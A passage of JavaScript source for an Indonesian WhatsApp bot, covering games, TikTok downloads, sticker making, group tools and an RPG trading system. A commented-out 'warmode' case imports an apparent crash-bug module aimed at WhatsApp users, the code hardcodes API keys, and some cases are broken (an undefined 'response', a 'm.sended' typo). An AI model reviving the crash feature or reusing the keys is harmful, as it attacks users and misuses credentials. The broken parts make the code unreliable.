             	puasss = `┌─❖ ⌜ 𝙄𝙉𝘿𝙊𝙉𝙀𝙎𝙄𝘼𝙉 𝙏𝙄𝙈𝙀 ⌟
├  *Hari Ini* : ${hariini}
├  *Wib* : ${barat} WIB
├  *Wita* : ${tengah} WITA
├  *Wit* : ${timur} WIT
├  *Puasa* : ${jhari}Hari ${jjam}Jam ${jmenit}Menit ${jdetik}Detik
└─❖`
             	puasanya = `╔══════[ *MENUJU PUASA 2023* ]══════⊱
╠➤ *Hari Ini* : ${hariini}
╠➤ *Wib* : ${barat} _WIB_
╠➤ *Wita* : ${tengah} _WITA_
╠➤ *Wit* : ${timur} _WIT_
╠➤ *Hari Menuju Puasa* : _${jhari}Hari ${jjam}Jam ${jmenit}Menit ${jdetik}Detik_
╚════[ *FizzxMods* ]══════⊱
`
m.reply(puasanya)
}
break
//==================( HANDLER ) =================//
case 'chatai':
case 'openai': 
	if (!text) throw 'Masukkan Query Link!'
    
    if (!response.success) {
        return anjaaaaay(response.success)
    }

    return anjaaaaay(response.data)

	
	
	break
	/*case 'war':
case 'warmode': {
	const { ChatBugWangsaff } = require('./handler/bug');
	await ChatBugWangsaff(text, m, rixx, args, text, command, _p, participants);
	}
	break*/
//==================( BATAS HANDLER ) =================//
case 'tiktok': case 'tiktoknowm': {
                if (!text) throw 'Masukkan Query Link!'
                let btn = [
{buttonId: `tiktokmp3 ${text}`, buttonText: { displayText: 'Download Audio' }, type: 1 },
            {buttonId: `tiktokmp4 ${text}`, buttonText: { displayText: `Download Video`}, type: 1 }]
                                                  
              rixx.sendButtonText(m.chat, btn,  `\nPilih Methode Download Dibawah Ini...\n`, rixx.user.name, m)
              
            }
            break
            case 'tiktokmp4': {
            	var tt_rees = await fetchJson(`https://saipulanuar.ga/api/download/tiktok2?url=${text}&apikey=jPHjZpQF`)
reply(`*TIKTOK DOWNLOAD*

*Author:* FizzxModsss
*Judul:* ${tt_rees.result.judul}
*Source:* ${text}

Video dan audio sedang dikirim...`)
rixx.sendMessage(m.chat,{video:{url:tt_rees.result.video.link1}, caption:'No Watermark!'}, {quotes:fgclink2})
}
break
            case 'tiktokmp3': { 
            	if (!text) throw 'Masukkan Query Link!'
var tt_res = await fetchJson(`https://saipulanuar.ga/api/download/tiktok2?url=${text}&apikey=jPHjZpQF`)
reply(`*TIKTOK DOWNLOAD*

*Author:* FizzxModsss
*Judul:* ${tt_res.result.judul}
*Source:* ${text}

Video dan audio sedang dikirim...`)
/*rixx.sendMessage(m.chat,{video:{url:tt_res.result.video.link1}, caption:'No Watermark!'}, {quotes:m})*/
rixx.sendMessage(m.chat,{audio:{url:tt_res.result.audio.link1}, mimetype:'audio/mpeg', fileName:'audio.mp3'}, {quotes:fgclink2})

}
 break
      case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    rixx.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
case 'owner': case 'creator': {
                rixx.sendKontak(m.chat, global.owner, m)
            }
            break
case 'sc': {
	scnya = `Haloo @${sender.split('@')[0]} Bikin Sendiri Make Base Nya DikaArdnt Atau Beli Lah di Owner Gueee... Pencet Button Dibawah Ini`
	let btn = [
{buttonId: 'Creator', buttonText: { displayText: 'Owner' }, type: 1 }]
                                
              rixx.sendButtonText(m.chat, btn,  `${scnya}`, rixx.user.name, m)
              }
	break
case 'family100': {

if ('family100'+m.chat in _family100) {
m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await rixx.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
break
case 'tebak': {

/*if (!text) throw `Example : ${prefix+command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6. lontong`*/

const sections = [
{
	title: `Tebak Gambar`,
	rows: [
	    {title: "Menebak Gambar ", rowId: `${prefix}file gambar`}
	]
    },
    {
	title: `Tebak Kata`,
	rows: [
	    {title: "Menebak Kata", rowId: `${prefix}file kata`}
	]
    },
    {
	title: `Tebak Lagu`,
	rows: [
	    {title: "Menebak Lagu Random", rowId: `${prefix}file lagu`}
	]
    },
    {
	title: `Tebak Kalimat`,
	rows: [
	    {title: "Menebak Kalimat", rowId: `${prefix}file kalimat`}
	]
    },
    {
	title: `Tebak Lirik`,
	rows: [
	    {title: "Menebak Lirik Laguu", rowId: `${prefix}file lirik`}
	]
    },
    {
	title: `Tebak lontong`,
	rows: [
	    {title: "Gatau apaan coba aja", rowId: `${prefix}file lontong`}
	]
    },
]
let menunyaaa = `Haii ${pushname} Nih Tebak tebakan Nyaa Silahkan Di pilih Sesuai Keinginan Kamu :)`
const listMessage = {
  text: menunyaaa,
  footer: "© FizzxModsss",
  buttonText: "Klik Disini",
  sections
}
const tessghh = await rixx.sendMessage(m.chat, listMessage, { quoted: m })
}
break
case 'file': {
	if (!text) throw `Example : ${prefix+command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6. lontong`

if (args[0] === "lagu") {
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
let result = anu[Math.floor(Math.random() * anu.length)]
let msg = await rixx.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: fkontak })
rixx.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
rixx.sendButtonText(m.chat, [{ buttonId: 'file lagu', buttonText: { displayText: 'LANJUT MAIN' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, rixx.user.name, m)
delete tebaklagu[m.sender.split('@')[0]]
}
} else if (args[0] === 'gambar') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
rixx.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
rixx.sendButtonText(m.chat, [{ buttonId: 'file gambar', buttonText: { displayText: 'LANJUT MAIN' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, rixx.user.name, m)
delete tebakgambar[m.sender.split('@')[0]]
}
} else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
rixx.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
rixx.sendButtonText(m.chat, [{ buttonId: 'file kata', buttonText: { displayText: 'LANJUT MAIN' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, rixx.user.name, m)
delete tebakkata[m.sender.split('@')[0]]
}
} else if (args[0] === 'kalimat') {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
rixx.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
rixx.sendButtonText(m.chat, [{ buttonId: 'file kalimat', buttonText: { displayText: 'LANJUT MAIN' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, rixx.user.name, m)
delete tebakkalimat[m.sender.split('@')[0]]
}
} else if (args[0] === 'lirik') {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
rixx.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
rixx.sendButtonText(m.chat, [{ buttonId: 'file lirik', buttonText: { displayText: 'LANJUT MAIN' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, rixx.user.name, m)
delete tebaklirik[m.sender.split('@')[0]]
}
} else if (args[0] === 'lontong') {
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
rixx.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
})
await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
rixx.sendButtonText(m.chat, [{ buttonId: 'file lontong', buttonText: { displayText: 'LANJUT MAIN' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, rixx.user.name, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
}
}
}

break
case 'kuismath': case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let { genMath, modes } = require('./lib/math')
if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
let result = await genMath(text.toLowerCase())
rixx.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
}
}
break
case 'setdesc': case 'setdesk': {
if (!text) throw 'Text ?'
await rixx.groupUpdateDescription(m.chat, text).then((res) => anjay('Baiklah Tuan 😉')).catch((err) => reply(jsonformat(err)))
}
break
case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await rixx.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await rixx.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
            if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
            delete this.game[roomnya.id]
            m.reply(`Berhasil delete session room tictactoe !`)
            }
            break
case 'suitpvp': case 'suit': {
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_
@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit
Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await rixx.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) rixx.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
case 'linkgroup': case 'linkgc': {
if (!isBotAdmins) throw mess.botAdmin
let response = await rixx.groupInviteCode(m.chat)
rixx.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isAdmins) throw mess.admin
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix+command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix+command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix+command}`
let media = await rixx.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("./baseikal/lib/myfunc")
var { img } = await generateProfilePicture(media)
await rixx.query({ tag: 'iq',attrs: { to: m.chat, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await rixx.updateProfilePicture(m.chat, { url: media }) }
m.reply('Baiklah Tuan 😉')
} catch { anjay('Gagal Mengganti Photo Profile') }
}
break
case 'setppbot': {
                
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix+command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix+command}`
                let media = await rixx.downloadAndSaveMediaMessage(quoted)
                
                /*await rixx.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))*/
                try {
if (args[0] == "/panjang") {
const { generateProfilePicture } = require("./baseikal/lib/myfunc")
var { img } = await generateProfilePicture(media)
await rixx.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await rixx.updateProfilePicture(botNumber, { url: media }) }
anjay(mess.success)
} catch { anjay('Gagal Mengganti Photo Profile') }
}
                break
                
                
                break
case 'once': case 'toonce': { 
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await rixx.downloadAndSaveMediaMessage(quoted)
rixx.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: hw })
} else if (/video/.test(mime)) {
anu = await rixx.downloadAndSaveMediaMessage(quoted)
rixx.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: hw })
}
}
break
case 'hidetag':
case 'ht':{
rixx.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: hw })
}
break
case 'addvn':
					if (!quoted) throw `Reply Audionya Tuan.`
                    if (/audio/.test(mime)) {
                    	svst = args.join(' ')
					if (!svst) return m.reply('```Nama Audio nya apa```')
					let media = await quoted.download()
					audionye.push(`${svst}`)
					fs.writeFileSync(`./lib/${svst}.opus`, media)
					fs.writeFileSync('./lib/vn.json', JSON.stringify(audionye))
					
					m.reply( `Sukses Menambahkan Audio Ke Database.`)
					}
					break
           case 'delvn':
  
					try {
					 sex = args.join(' ')
					 wanu = audionye.indexOf(sex)
					 audionye.splice(wanu, 1)
					 fs.unlinkSync(`./lib/${sex}.opus`)
					 m.reply('Sukses')
					} catch (err){
						console.log(err)
						m.reply('Error njir')
					}
					break
			
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix+command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await rixx.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await rixx.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`
}
}
break
case 'emojimix': {
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix+command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix+command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await rixx.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//═══════════[ Rpg Menu ]═══════════\\

 //cr thunder
case 'inventori': case 'inventory': case 'profile':{

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
if (!isInventory){ addInventori(m.sender) }
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }

let teksehmazeh = `_[ INFO USER ]_\n\n`
teksehmazeh += `*❤ ️•Darah kamu:* ${getDarah(m.sender)}\n`
teksehmazeh += `*◻️️ •Besi kamu:* ${getBesi(m.sender)}\n`
teksehmazeh += `*🌟 •Emas Kamu:* ${getEmas(m.sender)}\n`
teksehmazeh += `*❇️ •Emerald Kamu:* ${getEmerald(m.sender)}\n`
teksehmazeh += `*⏺ •️Limit kamu:* ${getLimit(m.sender)}\n`
teksehmazeh += `*🧪 •Potion Kamu:* ${getPotion(m.sender)}\n\n`
teksehmazeh += `_[ HASIL BURUAN ]_\n\n`
teksehmazeh += `*🐟 •Ikan:* ${getIkan(m.sender)}\n`
teksehmazeh += `*🐔 •Ayam:* ${getAyam(m.sender)}\n`
teksehmazeh += `*🐇 •Kelinci:* ${getKelinci(m.sender)}\n`
teksehmazeh += `*🐑 •Domba:* ${getDomba(m.sender)}\n`
teksehmazeh += `*🐄 •Sapi:* ${getSapi(m.sender)}\n`
teksehmazeh += `*🐘 •Gajah:* ${getGajah(m.sender)}\n\n`
reply(teksehmazeh)
}
break
 case 'leaderboard': { 
 
let txt = `「 *LEADERBOARD* 」\n\n`
for (let i of _buruan){
txt += `➸ *ID :* ${i.id}\n`
txt += `*🐟 Ikan* : ${i.ikan}\n`
txt += `*🐔 Ayam* : ${i.ayam}\n`
txt += `*🐇 Kelinci* : ${i.kelinci}\n`
txt += `*🐑 Domba* : ${i.domba}\n`
txt += `*🐄 Sapi* : ${i.sapi}\n`
txt += `*🐘 Gajah* : ${i.gajah}\n\n`
}
 reply(txt)
}
 break
case 'mining': case 'mine':{
if (!isInventory){ addInventori(m.sender) }
if (isCekDarah < 1) return reply(`Kamu kelelahan!, cobalah heal menggunakan potion`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( () => {
let caption = `[ Hasil Tambang ]\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
let buttons = [
 {
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Menambang Lagi ⛏️'
 }, type: 1},
 ]
 let buttonMessage = {
 image: { url: './baseikal/gambarnye/tambang.jpg' },
 caption: caption,
 footer: pushname,
 buttons: buttons,
 headerType: 4
}
rixx.sendMessage(from, buttonMessage, { quoted: m })

}, 7000)
setTimeout( () => {
reply(`${pushname} Mulai Menambang⛏️`)
}, 1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sended, emasnya)
addEmerald(m.sender, emeraldnya)
}
break
//transaksi
 case 'beli': case 'buy':{

if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 if (!q) return reply(`Apa yg ingin kamu beli?\n\n1.potion\n2.baitfood\n\nContoh: ${prefix + command} baitfood`)
 var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Potion Mu:* ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Bait Food Mu:* ${getUmpan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Your Limit* : ${getLimit(m.sender)}`)
}, 2000) 
} else { reply("Incorrect Format!") }
 }
 break
 
 case 'sell': case 'jual':{
 
 if (!q) return reply(`What Do You Want To Sell??\nContoh : ${prefix + command} fish 2`)
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 var anu = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anu) return reply(`Kamu Tidak Memiliki Cukup Ikan Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
 let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ikan Mu:* ${getIkan(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'ayam'){
 if (isAyam < anu) return reply(`Kamu Tidak Memiliki Cukup Ayam Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
 let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ayam Mu:* ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'kelinci'){
 if (isKelinci < anu) return reply(`Kamu Tidak Memiliki Cukup Kelinci Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
 let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Kelinci Mu:* ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'domba'){
 if (isDomba < anu) return reply(`Kamu Tidak Memiliki Cukup Domba Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
 let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Domba Mu:* ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sapi'){
 if (isSapi < anu) return reply(`Kamu Tidak Memiliki Cukup Sapi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
 let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Sapi Mu:* ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gajah'){
 if (isGajah < anu) return reply(`Kamu Tidak Memiliki Cukup Gajah Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
 let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Gajahmu:* ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anu) return reply(`Kamu Tidak Memiliki Cukup Besi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
 let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Besi Mu:* ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anu) return reply(`Kamu Tidak Memiliki Cukup Emas Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
 let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emas Mu:* ${getEmas(m.sender)}`)
}, 2000) 
 } else
